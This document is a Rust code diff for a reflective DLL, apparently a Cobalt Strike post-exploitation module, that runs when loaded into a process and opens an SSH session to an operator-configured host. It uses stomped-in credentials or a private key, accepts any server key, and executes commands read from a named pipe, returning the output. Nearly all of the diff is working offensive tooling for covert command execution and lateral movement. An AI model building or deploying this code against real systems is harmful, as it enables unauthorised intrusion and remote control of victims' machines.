@@ -6,14 +6,23 @@ mod ffi;
 mod pipe;
 mod windows;
 
-use std::io::Read;
 use crate::pipe::*;
 
 use std::os::raw::c_void;
+use std::ptr::null_mut;
 use windows::*;
 
-use std::net::TcpStream;
-use ssh2::Session;
+use std::sync::Arc;
+use std::thread;
+use std::time::Duration;
+use tokio::runtime::Runtime;
+use russh::keys::*;
+use russh::*;
+use russh::client::{Config, Handle};
+use tokio::main;
+use windows_sys::Win32::Foundation::CloseHandle;
+use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE, LPTHREAD_START_ROUTINE};
+// Keep this for pipe handle cleanup
 
 // IPv4 ADDRESS IS STOMPED IN BY .CNA
 #[cfg(not(debug_assertions))]
@@ -25,158 +34,237 @@ pub static PASSWORD_STRING: &[u8; 66] = b"PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD
 
 /// Debug config
 #[cfg(debug_assertions)]
-pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.228\0\0\0\0\0\0\0";
+pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.18\0\0\0\0\0\0\0\0";
 #[cfg(debug_assertions)]
 pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 #[cfg(debug_assertions)]
 pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 
-pub static SSH_KEY: &[u8; 1707] = b"SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_";
+pub static SSH_KEY: &[u8; 2050] = b"SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_C\0";
 
 const SSH_PORT: u16 = 22;
+
+struct Client {}
+impl client::Handler for Client {
+    type Error = russh::Error;
+    async fn check_server_key(
+        &mut self,
+        _server_public_key: &ssh_key::PublicKey,
+    ) -> Result<bool, Self::Error> {
+        Ok(true)
+    } // ToDo
+}
+
+unsafe extern "system" fn dll_main_caller(_param: *mut c_void) -> u32{
+    dll_main();
+    0
+}
 
 /// Entry point for the custom Rust-based DLL.
 ///
 /// This function serves as the main entry point for invoking functionality
 /// via the Reflective DLL template. As examples, it performs the following operations:
 ///
-/// 1. Displays a message box with a greeting message using the `MessageBoxA` Windows API call.
-/// 2. Delegates execution to an external C entry point function (`c_entry`) for further processing.
-/// 3. Outputs a message using a named pipe or standard output, depending on the build configuration.
+/// 1. Outputs a message using a named pipe or standard output, depending on the build configuration.
 #[unsafe(no_mangle)]
-#[allow(named_asm_labels)]
-#[allow(non_snake_case, unused_variables)]
-pub fn dll_main() {
-
-    // let ssh_key = String::from_utf8_lossy(SSH_KEY);
-    // println!("KEY:{}\nLEN:{}", ssh_key.clone(), ssh_key.len());
-
+#[tokio::main(flavor = "current_thread")]
+pub async fn dll_main()
+{
     let h_output_pipe = match initialize_output_pipe() {
-        None => return,
+        None => {
+            // Optionally log this error if you have a mechanism
+            return;
+        }
         Some(h) => h,
     };
 
-    // Convert the IP address bytes to string more efficiently
-    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS).clone().trim_end_matches(char::from(0)).to_string();
-    let server_address = format!("{}:{}", ip_address, SSH_PORT);
+    // Convert the IP address bytes to string
+    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS)
+        .trim_end_matches(char::from(0))
+        .to_string();
+    let server_address = (ip_address.as_str(), SSH_PORT);
 
-    dbg!(&server_address);
+    // Get username, password, and SSH key from stomped-in values
+    let username = String::from_utf8_lossy(USERNAME_STRING)
+        .trim_end_matches(char::from(0))
+        .to_string();
+    let password = String::from_utf8_lossy(PASSWORD_STRING)
+        .trim_end_matches(char::from(0))
+        .to_string();
+    let ssh_key_bytes = SSH_KEY
+        .iter()
+        .take_while(|&&b| b != 0)
+        .cloned()
+        .collect::<Vec<u8>>();
 
-    // Connect to the local SSH server
-    let tcp = TcpStream::connect(server_address).unwrap();
-    let mut sess = Session::new().unwrap();
-    sess.set_tcp_stream(tcp);
-    sess.handshake().unwrap();
+    // Set up SSH client configuration
+    let config = Arc::new(Config {
+        inactivity_timeout: Some(Duration::from_secs(60)), // Example timeout
+        ..Default::default()
+    });
 
-    // Get username and password from stomped in values
-    let username = String::from_utf8_lossy(USERNAME_STRING).clone().trim_end_matches(char::from(0)).to_string();
-    let password = String::from_utf8_lossy(PASSWORD_STRING).clone().trim_end_matches(char::from(0)).to_string();
+    let sh = Client {};
 
-    if password.len() < 1 {
+    // Attempt to connect
+    let mut session_handle: Handle<Client> = match client::connect(config, server_address, sh).await {
+        Ok(session) => session,
+        Err(e) => {
+            write_output(h_output_pipe, &format!("SSH connection failed: {}\n", e));
+            return;
+        }
+    };
+
+    // Authenticate
+    let auth_success = if password.is_empty() && !ssh_key_bytes.is_empty() {
         // Authenticate with private key
-        let ssh_key = String::from_utf8_lossy(SSH_KEY).clone().trim_end_matches(char::from(0)).to_string();
-        sess.userauth_pubkey_memory(username.as_str(), None, &*ssh_key, None ).unwrap();
-    }else{
-        sess.userauth_password(&*username, &*password).unwrap();
+        match std::str::from_utf8(&ssh_key_bytes) {
+            Ok(key_pem_str) => {
+                match russh::keys::decode_secret_key(key_pem_str, None) {
+                    Ok(key_pair) => {
+                        match session_handle.authenticate_publickey(
+                            &username,
+                            russh::keys::PrivateKeyWithHashAlg::new(
+                                Arc::new(key_pair),
+                                session_handle.best_supported_rsa_hash().await.unwrap().unwrap(),
+                            )
+                        ).await {
+                            Ok(auth_res) => auth_res,
+                            Err(e) => {
+                                write_output(h_output_pipe, &format!("SSH key authentication error: {}\n", e));
+                                return;
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        write_output(h_output_pipe, &format!("Failed to load private key: {}\n", e));
+                        return;
+                    }
+                }
+            }
+            Err(e) => {
+                write_output(h_output_pipe, &format!("Private key is not valid UTF-8: {}\n", e));
+                return;
+            }
+        }
+
+    } else if !password.is_empty() {
+        // Authenticate with password
+        match session_handle.authenticate_password(&username, &password).await {
+            Ok(auth_res) => auth_res,
+            Err(e) => {
+                write_output(h_output_pipe, &format!("SSH password authentication error: {}\n", e));
+                return;
+            }
+        }
+    } else {
+        write_output(h_output_pipe, "No password or SSH key provided for authentication.\n");
+        return;
+    };
+
+    if !auth_success.success() {
+        write_output(h_output_pipe, &format!("Authentication failed for user {}.\n", username));
+        let _ = session_handle.disconnect(Disconnect::ByApplication, "Auth failed", "en").await;
+        return;
     }
 
-    if sess.authenticated() {
-        write_output(h_output_pipe, format!("Authenticated user {}.\n", username).as_str());
-    }else{
-        write_output(h_output_pipe, format!("FAILED authenticating user {}.\n", username).as_str());
-    }
+    write_output(h_output_pipe, &format!("Authenticated user {}.\n", username));
 
     let h_input_pipe = match initialize_input_pipe() {
-        None => return,
+        None => {
+            write_output(h_output_pipe, "Failed to initialize input pipe.\n");
+            let _ = session_handle.disconnect(Disconnect::ByApplication, "Pipe init failed", "en").await;
+            return;
+        }
         Some(h) => h,
     };
 
-    loop{
-
-        let mut channel = sess.channel_session().unwrap();
-
+    loop {
         let user_input = match read_input(h_input_pipe) {
-            None => continue,
+            None => continue, // Or handle pipe error more gracefully
             Some(s) => s,
         };
 
-        // Create a null-terminated copy for Windows API calls
-        let display_string = format!("{}\0", user_input);
-
-        // Check if the user wants to exit
-        if user_input.starts_with("exit") {
-            write_output(h_output_pipe, format!("Closing session to {}", ip_address).as_str());
-            channel.close().unwrap();
+        if user_input.trim().eq_ignore_ascii_case("exit") {
+            write_output(h_output_pipe, &format!("Closing session to {}\n", ip_address));
             break;
         }
 
-        // Create a separate string for the command and remove null bytes
         let command: String = user_input.trim().chars().filter(|&c| c != '\0').collect();
-        let res = match channel.exec(&command){
-            Ok(c) => c,
-            Err(e) => {
-                let msg = e.to_string();
-                write_output(h_output_pipe, format!("Error: {}.\n", msg).as_str());
-                continue;
+        if command.is_empty() {
+            continue;
+        }
+
+        match session_handle.channel_open_session().await {
+            Ok(mut channel) => {
+                if let Err(e) = channel.exec(true, command.as_str()).await {
+                    write_output(h_output_pipe, &format!("Error executing command: {}\n", e));
+                    continue;
+                }
+
+                let mut full_output = String::new();
+                loop {
+                    match channel.wait().await {
+                        Some(ChannelMsg::Data { data }) => {
+                            if let Ok(text) = String::from_utf8(data.to_vec()) {
+                                full_output.push_str(&text);
+                            }
+                        }
+                        Some(ChannelMsg::ExitStatus { exit_status }) => {
+                            // Include the exit status in the output
+                            full_output.push_str(&format!("\nExit status: {}", exit_status));
+                            write_output(h_output_pipe, &full_output);
+                            full_output.clear(); // Prepare for next potential output block or break
+                            break; // Command finished
+                        }
+                        Some(ChannelMsg::Eof) => {
+                            // End of data for this channel
+                            if !full_output.is_empty() {
+                                write_output(h_output_pipe, &full_output);
+                                full_output.clear();
+                            }
+                            break;
+                        }
+                        None => { // Channel closed or error
+                            if !full_output.is_empty() {
+                                write_output(h_output_pipe, &full_output);
+                            }
+                            break;
+                        }
+                        _ => {} // Ignore other messages like ExtendedData, WindowAdjust, etc. for simple exec
+                    }
+                }
+                // Ensure channel is closed if not already
+                let _ = channel.close().await;
             }
-        };
-
-        let mut s = String::new();
-        channel.read_to_string(&mut s).unwrap();
-
-        write_output(h_output_pipe, &*s);
+            Err(e) => {
+                write_output(h_output_pipe, &format!("Error opening channel: {}\n", e));
+            }
+        }
     }
 
-    // Close Handles
-    unsafe{
-        CloseHandle(h_input_pipe);
-        CloseHandle(h_output_pipe);
+    // Disconnect the SSH session
+    if let Err(e) = session_handle.disconnect(Disconnect::ByApplication, "User exited", "en").await {
+        write_output(h_output_pipe, &format!("Error during disconnect: {}\n", e));
     }
-}
 
-/// Retrieves the instruction pointer (IP) on the `x86_64` architecture.
-///
-/// This function obtains the current value of the instruction pointer (RIP register)
-/// using inline assembly. It can be used to determine the memory address of the
-/// currently executing instruction, which is helpful for low-level debugging,
-/// locating code regions, or working with reflective APIs.
-///
-/// # Returns
-/// A `usize` representing the value of the instruction pointer (RIP).
-///
-/// # Safety
-/// - This function uses inline assembly, which is inherently unsafe.
-#[cfg(target_arch = "x86_64")]
-unsafe fn get_ip() -> usize {
-    let rip: usize;
-    unsafe { std::arch::asm!("lea {}, [rip]", out(reg) rip) };
-    rip
-}
-
-/// Retrieves the instruction pointer (IP) on the `x86` architecture.
-///
-/// This function obtains the current value of the instruction pointer (EIP register)
-/// using inline assembly. It is useful for determining the memory address of the
-/// next executing instruction, which aids in low-level debugging, reflective APIs,
-/// and locating code regions.
-///
-/// # Returns
-/// A `usize` representing the value of the instruction pointer (EIP).
-///
-/// # Safety
-/// - This function uses inline assembly, which is inherently unsafe.
-#[cfg(target_arch = "x86")]
-unsafe fn get_ip() -> usize {
-    let eip: usize;
+    // Clean up pipe handles (input pipe handle needs to be in scope here or passed)
     unsafe {
-        std::arch::asm!(
-        "call 1f",
-        "1: pop {}",
-        out(reg) eip,
-        );
+        if h_input_pipe != std::ptr::null_mut() && h_input_pipe != INVALID_HANDLE_VALUE { // Assuming INVALID_HANDLE_VALUE is -1 or 0
+            CloseHandle(h_input_pipe);
+        }
+        if h_output_pipe != std::ptr::null_mut() && h_output_pipe != INVALID_HANDLE_VALUE {
+            CloseHandle(h_output_pipe);
+        }
     }
+}
 
-    eip
+#[unsafe(no_mangle)]
+pub unsafe extern "system" fn dll_start(){
+    // Create a new thread with its own tokio runtime
+    unsafe {
+        let h_thread = CreateThread(null_mut(), 0, Some(dll_main_caller), null_mut(), 0, null_mut() );
+        WaitForSingleObject(h_thread, INFINITE);
+    }
 }
 
 #[unsafe(no_mangle)]
@@ -189,9 +277,10 @@ pub unsafe extern "system" fn DllMain(
 ) -> BOOL {
     match call_reason {
         DLL_PROCESS_ATTACH => {
-            // Code to run when the DLL is loaded into a process
+
             // Initialize resources, etc.
-            dll_main();
+            unsafe { dll_start() };
+
         }
         DLL_THREAD_ATTACH => {
             // Code to run when a new thread is created in the process
